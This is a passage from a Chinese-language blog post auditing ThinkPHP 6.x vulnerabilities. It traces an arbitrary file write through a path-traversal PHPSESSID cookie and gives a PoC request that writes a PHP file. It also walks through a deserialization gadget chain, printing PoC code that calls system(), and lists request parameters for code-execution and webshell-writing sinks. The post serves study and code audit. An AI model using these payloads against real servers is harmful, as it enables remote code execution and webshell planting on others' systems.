+Pipeline.php:84, think\Pipeline-&gt;think\&#123;closure:D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Pipeline.php:82-88&#125;()
+Pipeline.php:65, think\Pipeline-&gt;then()
+Http.php:204, think\Http-&gt;runWithRequest()
+Http.php:162, think\Http-&gt;run()
+index.php:20, &#123;main&#125;()
+</code></pre>
+<p>返回<code>handle()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707110224668.png" alt="image-20230707110224668"></p>
+<p>发现后面会再次取出PHPSESSID的值传给<code>setId</code>进行检查</p>
+<p>后面的过程就是发送给客户端</p>
+<p>当程序结束的时候，会执行中间件</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707110744130.png" alt="image-20230707110744130"></p>
+<p>里面会调用Sessioninit.php的end方法</p>
+<pre><code class="php">public function end(Response $response)
+    &#123;
+        $this-&gt;session-&gt;save();
+    &#125;
+</code></pre>
+<p>往下会执行,调用栈如下：</p>
+<pre><code>Store.php:263, think\session\Store-&gt;save()
+Manager.php:174, think\Manager-&gt;__call()
+SessionInit.php:78, think\Manager-&gt;save()
+SessionInit.php:78, think\middleware\SessionInit-&gt;end()
+Middleware.php:165, think\Middleware-&gt;end()
+Http.php:279, think\Http-&gt;end()
+index.php:24, &#123;main&#125;()
+</code></pre>
+<p>在这里存在一个日志写入的操作</p>
+<pre><code class="php">public function save(): void
+    &#123;
+        $this-&gt;clearFlashData();
+
+        $sessionId = $this-&gt;getId();
+
+        if (!empty($this-&gt;data)) &#123;
+            $data = $this-&gt;serialize($this-&gt;data);
+
+            $this-&gt;handler-&gt;write($sessionId, $data);
+        &#125; else &#123;
+            $this-&gt;handler-&gt;delete($sessionId);
+        &#125;
+
+        $this-&gt;init = false;
+    &#125;
+</code></pre>
+<p>跟进<code>write()</code></p>
+<pre><code class="php">public function write(string $sessID, string $sessData): bool
+    &#123;
+        $filename = $this-&gt;getFileName($sessID, true);
+        $data     = $sessData;
+
+        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;
+            //数据压缩
+            $data = gzcompress($data, 3);
+        &#125;
+
+        return $this-&gt;writeFile($filename, $data);
+    &#125;
+</code></pre>
+<p>跟进<code>getFileName</code>  查看文件名生成规则，</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111534094.png" alt="image-20230707111534094"></p>
+<p>简而言之，就是</p>
+<pre><code>日志路径/文件名
+文件名 = sess_  + PHPSSID的值
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111754581.png" alt="image-20230707111754581"></p>
+<p>返回后，获取<code>$data</code>, 这个$data是序列化后的session值</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111921264.png" alt="image-20230707111921264"></p>
+<p>然后将这两个值传给<code>writeFile</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707112027859.png" alt="image-20230707112027859"></p>
+<p>跟进</p>
+<pre><code class="php">protected function writeFile($path, $content): bool
+ &#123;
+    return (bool) file_put_contents($path, $content, LOCK_EX);
+&#125;
+</code></pre>
+<p>这里是调用了<code>file_put_contents</code> 进行文件写入</p>
+<p>$path, $content都是可以控制的，  $content就是序列化后session的内容，$path就是sess_  + PHPSSID的值</p>
+<p>$path这里可以通过目录穿越写入任意文件，但是需要满足<code>setId</code>的检查，长度必须要32位</p>
+<pre><code class="php">public function setId($id = null): void
+    &#123;
+        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
+    &#125;
+</code></pre>
+<p>所以构造POC如下：</p>
+<pre><code>http://127.0.0.1/?demo=&lt;?php phpinfo();?&gt;
+
+Cookie: PHPSESSID=/../../../public/11111111111.php
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113517298.png" alt="image-20230707113517298"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113531457.png" alt="image-20230707113531457"><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113610880.png" alt="image-20230707113610880"></p>
+<h3 id="反序列-6-0-15"><a href="#反序列-6-0-15" class="headerlink" title="反序列 (6.0.15)"></a>反序列 (6.0.15)</h3><pre><code class="php">&lt;?php
+namespace app\controller;
+
+use app\BaseController;
+
+class Index extends BaseController
+&#123;
+    public function index()
+    &#123;
+        $u = unserialize($_GET[&#39;c&#39;]);
+        return &#39;ThinkPHP V6.x&#39;;
+    &#125;
+
+&#125;
+</code></pre>
+<p>全局搜索__destruct(),发现TP6移除了TP5反序列化中的<code>think/process/pipes/Windows.php</code>入口</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707141236993.png" alt="image-20230707141236993"></p>
+<p>尝试寻找其他入口，查看<code>vendor/topthink/think-orm/src/Model.php</code>这个</p>
+<pre><code class="php">public function __destruct()
+    &#123;
+        if ($this-&gt;lazySave) &#123;
+            $this-&gt;save();
+        &#125;
+    &#125;
+</code></pre>
+<p>这个$this-&gt;lazySave可控，可以进入$this-&gt;save()</p>
+<p>跟进<code>save()</code></p>
+<pre><code class="php">public function save(array $data = [], string $sequence = null): bool
+    &#123;
+        // 数据对象赋值
+        $this-&gt;setAttrs($data);
+
+        if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) &#123;
+            return false;
+        &#125;
+
+        $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);
+
+        if (false === $result) &#123;
+            return false;
+        &#125;
+
+        // 写入回调
+        $this-&gt;trigger(&#39;AfterWrite&#39;);
+
+        // 重新记录原始数据
+        $this-&gt;origin   = $this-&gt;data;
+        $this-&gt;get      = [];
+        $this-&gt;lazySave = false;
+
+        return true;
+    &#125;
+</code></pre>
+<p>这可以控制$this-&gt;exists使得函数调用<code>$this-&gt;updateData()</code></p>
+<p>跟进<code>$this-&gt;updateData()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707144819630.png" alt="image-20230707144819630"></p>
+<p>跟进<code>checkAllowFields()</code> </p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165249733.png" alt="image-20230707165249733"></p>
+<p>跟进db()</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165321713.png" alt="image-20230707165321713"></p>
+<p>这里存在一个字符串拼接可以触发任意类的<code>__toString</code></p>
+<p>这里后面就可以使用<code>TP5.1.x</code>后半段的链子了</p>
+<p>全局搜索<code>__toString</code> 找到<code>vendor/topthink/think-orm/src/model/concern/Conversion.php</code></p>
+<pre><code class="php">public function __toString()
+    &#123;
+        return $this-&gt;toJson();
+    &#125;
+</code></pre>
+<p>跟进<code>toJson()</code></p>
+<pre><code class="php">public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
+    &#123;
+        return json_encode($this-&gt;toArray(), $options);
+    &#125;
+</code></pre>
+<p>跟进<code>toArray()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165504741.png" alt="image-20230707165504741"></p>
+<p>这个方法里面调用 了<code>getAtter</code></p>
+<p>跟进：</p>
+<pre><code class="php">public function getAttr(string $name)
+    &#123;
+        try &#123;
+            $relation = false;
+            $value    = $this-&gt;getData($name);
+        &#125; catch (InvalidArgumentException $e) &#123;
+            $relation = $this-&gt;isRelationAttr($name);
+            $value    = null;
+        &#125;
+
+        return $this-&gt;getValue($name, $value, $relation);
+    &#125;
+</code></pre>
+<p>最后调用了<code>getValue</code></p>
+<p>跟进</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165728185.png" alt="image-20230707165728185"></p>
+<p>这个$closure是可控的，可以用来调用任意函数比如system()，其参数$value,是由上一层传来的参数控制，也可控</p>
+<p>链子到这里结束</p>
+<p>POC：</p>
+<pre><code class="php">&lt;?php
+namespace think;
+abstract class Model
+&#123;
+    private $lazySave;
+    protected $suffix;
+    private $data;
+    private $withAttr;
+    function __construct($obj = &#39;&#39;)
+    &#123;
+        $this-&gt;lazySave = true;
+        $this-&gt;suffix =$obj;
+        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];
+        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];
+    &#125;
+&#125;
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model
+&#123;
+&#125;
+$a = new Pivot();
+$b = new Pivot($a);
+echo urlencode(serialize($b));
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707170252876.png" alt="image-20230707170252876"></p>
+<p>写在后面：</p>
+<p>上面最后执行的方法在：</p>
+<pre><code>vendor/topthink/think-orm/src/model/concern/Attribute.php
+</code></pre>
+<p>在TP6后这里已经修复了：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707171052318.png" alt="image-20230707171052318"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化<code>__destruct</code>入口就那4-5个，常用的是这两个<code>think/process/pipes/Windows.php</code> 和<code>thinkphp/library/think/Process.php</code></p>
+<p>上面提到的几条利用链，可以小记一下，但是<code>vendor/topthink/think-orm/src/model/concern/Attribute.php</code> 的<code>getValue</code>方法在TP6里面不能用了，需要寻找其他利用方法</p>
+<p>Request.php中很多方法调用了<code>filterValue</code>,而该方法中就存在可利用的 <code>call_user_func</code>函数,反序列化结尾的利用可以考虑这里</p>
+<p>php能代码执行的函数</p>
+<pre><code class="php">//App.php
+//传参 ：call_user_func_array&amp;vars[0]=system&amp;vars[1][]=calc
+public static function invokeFunction($function, $vars = [])
+    &#123;
+        $reflect = new \ReflectionFunction($function);
+        $args    = self::bindParams($reflect, $vars);
+
+        // 记录执行信息
+        self::$debug &amp;&amp; Log::record(&#39;[ RUN ] &#39; . $reflect-&gt;__toString(), &#39;info&#39;);
+
+        return $reflect-&gt;invokeArgs($args);
+    &#125;
+</code></pre>
+<pre><code class="php">//think/Request.php
+//传参： filter[]=system&amp;data=calc
+public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    &#123;
+        if (false === $name) &#123;
+            // 获取原始数据
+            return $data;
+        &#125;
+
+        $name = (string) $name;
+        if (&#39;&#39; != $name) &#123;
+            // 解析name
+            if (strpos($name, &#39;/&#39;)) &#123;
+                list($name, $type) = explode(&#39;/&#39;, $name);
+            &#125;
+
+            $data = $this-&gt;getData($data, $name);
+
+            if (is_null($data)) &#123;
+                return $default;
+            &#125;
+
+            if (is_object($data)) &#123;
+                return $data;
+            &#125;
+        &#125;
+
+        // 解析过滤器
+        $filter = $this-&gt;getFilter($filter, $default);
+
+        if (is_array($data)) &#123;
+            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+            if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) &#123;
+                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
+                $this-&gt;arrayReset($data);
+            &#125;
+        &#125; else &#123;
+            $this-&gt;filterValue($data, $name, $filter);
+        &#125;
+
+        if (isset($type) &amp;&amp; $data !== $default) &#123;
+            // 强制类型转换
+            $this-&gt;typeCast($data, $type);
+        &#125;
+
+        return $data;
+    &#125;
+</code></pre>
+<pre><code class="php">//think/view/driver/Php.php
+//传参： content=&lt;?php phpinfo();?&gt;
+public function display($content, $data = [])
+    &#123;
+        $this-&gt;content = $content;
+
+        extract($data, EXTR_OVERWRITE);
+        eval(&#39;?&gt;&#39; . $this-&gt;content);
+    &#125;
+</code></pre>
+<p>写shell:</p>
+<pre><code class="php">//think/template/driver/File.php
+//传参： cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
+public function write($cacheFile, $content)
+    &#123;
+        // 检测模板目录
+        $dir = dirname($cacheFile);
+
+        if (!is_dir($dir)) &#123;
+            mkdir($dir, 0755, true);
+        &#125;
+
+        // 生成模板缓存文件
+        if (false === file_put_contents($cacheFile, $content)) &#123;
+            throw new Exception(&#39;cache write error:&#39; . $cacheFile, 11602);
+        &#125;
+    &#125;
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">http://example.com/2023/07/08/ThinkPHP-代码审计/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/wallhaven-y8wozk_2560x1440.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="NginxWebUi 任意命令执行漏洞"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-vq5d9l_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NginxWebUi 任意命令执行漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP-2-x"><span class="toc-number">1.2.</span> <span class="toc-text">ThinkPHP 2.x</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace-x2F-e%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.</span> <span class="toc-text">preg_replace &#x2F;e模式代码执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP-3-x"><span class="toc-number">1.3.</span> <span class="toc-text">ThinkPHP 3.x</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-where-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.2.3 where 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-exp%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2.3 exp注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-bind%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.2.3 bind注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-order-by%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.4.</span> <span class="toc-text">3.2.3  order by注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-update%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.5.</span> <span class="toc-text">3.2.3  update注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-delete%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.6.</span> <span class="toc-text">3.2.3  delete注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.7.</span> <span class="toc-text">3.2.3 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-4-CVE-2018-18546%EF%BC%88%E4%B8%8A%E9%9D%A2Order-by%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.8.</span> <span class="toc-text">3.2.4 CVE-2018-18546（上面Order by注入的绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-4-CVE-2018-18529"><span class="toc-number">1.3.9.</span> <span class="toc-text">3.2.4 CVE-2018-18529</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-3-CVE-2018-10225"><span class="toc-number">1.3.10.</span> <span class="toc-text">3.1.3 CVE-2018-10225</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP-5-x"><span class="toc-number">1.4.</span> <span class="toc-text">ThinkPHP 5.x</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-0-15-ParseData%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">5.0.15 ParseData方法注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-6-paraArraryData%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">5.1.6 paraArraryData方法注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-6-parseWhereItem%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.3.</span> <span class="toc-text">5.1.6 parseWhereItem方法注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-22-parseOrder%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.4.</span> <span class="toc-text">5.1.22  parseOrder方法注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-0-10-cacheFile%E5%8F%98%E9%87%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.5.</span> <span class="toc-text">5.0.10 cacheFile变量文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-0-10-cache%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.6.</span> <span class="toc-text">5.0.10 cache缓存函数远程代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%881%EF%BC%89"><span class="toc-number">1.4.7.</span> <span class="toc-text">远程代码执行（1）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-0-7-lt-x3D-ThinkPHP5-lt-x3D-5-0-22"><span class="toc-number">1.4.7.1.</span> <span class="toc-text">5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30"><span class="toc-number">1.4.7.2.</span> <span class="toc-text">5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%882%EF%BC%89"><span class="toc-number">1.4.8.</span> <span class="toc-text">远程代码执行（2）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-0-0-lt-x3D-ThinkPHP5-lt-x3D-5-0-23-and-5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30"><span class="toc-number">1.4.8.1.</span> <span class="toc-text">5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 and 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.4.9.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-0-x"><span class="toc-number">1.4.9.1.</span> <span class="toc-text">5.0.x</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%EF%BC%885-0-24%EF%BC%89"><span class="toc-number">1.4.9.1.1.</span> <span class="toc-text">高版本（5.0.24）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC-%EF%BC%885-0-3%EF%BC%89"><span class="toc-number">1.4.9.1.2.</span> <span class="toc-text">低版本 （5.0.3）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-x"><span class="toc-number">1.4.9.2.</span> <span class="toc-text">5.1.x</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-x"><span class="toc-number">1.4.9.3.</span> <span class="toc-text">5.2.x</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP-6-x"><span class="toc-number">1.5.</span> <span class="toc-text">ThinkPHP 6.x</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%EF%BC%886-0-0%EF%BC%8C6-0-1%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">任意文件写（6.0.0，6.0.1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97-6-0-15"><span class="toc-number">1.5.2.</span> <span class="toc-text">反序列 (6.0.15)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP 代码审计"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-y8wozk_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="ThinkPHP 代码审计"/></a><div class="content"><a class="title" href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP 代码审计">ThinkPHP 代码审计</a><time datetime="2023-07-08T04:50:35.000Z" title="发表于 2023-07-08 12:50:35">2023-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="NginxWebUi 任意命令执行漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-vq5d9l_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="NginxWebUi 任意命令执行漏洞"/></a><div class="content"><a class="title" href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="NginxWebUi 任意命令执行漏洞">NginxWebUi 任意命令执行漏洞</a><time datetime="2023-07-01T11:29:59.000Z" title="发表于 2023-07-01 19:29:59">2023-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/28/%E5%85%B3%E4%BA%8EWeblogic%E6%BC%8F%E6%B4%9E-CVE-2023-21839%E5%92%8CCVE-2023-21931/" title="关于Weblogic漏洞(CVE-2023-21839和CVE-2023-21931)"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-qzl3jq_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="关于Weblogic漏洞(CVE-2023-21839和CVE-2023-21931)"/></a><div class="content"><a class="title" href="/2023/06/28/%E5%85%B3%E4%BA%8EWeblogic%E6%BC%8F%E6%B4%9E-CVE-2023-21839%E5%92%8CCVE-2023-21931/" title="关于Weblogic漏洞(CVE-2023-21839和CVE-2023-21931)">关于Weblogic漏洞(CVE-2023-21839和CVE-2023-21931)</a><time datetime="2023-06-28T07:25:29.000Z" title="发表于 2023-06-28 15:25:29">2023-06-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/23/CommonsCollections2/" title="CommonsCollections2"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-yjvgzd_2560x1600.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonsCollections2"/></a><div class="content"><a class="title" href="/2023/06/23/CommonsCollections2/" title="CommonsCollections2">CommonsCollections2</a><time datetime="2023-06-23T06:05:51.000Z" title="发表于 2023-06-23 14:05:51">2023-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/202304161714754.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Shiro反序列化漏洞"/></a><div class="content"><a class="title" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞">Shiro反序列化漏洞</a><time datetime="2023-04-11T05:03:59.000Z" title="发表于 2023-04-11 13:03:59">2023-04-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
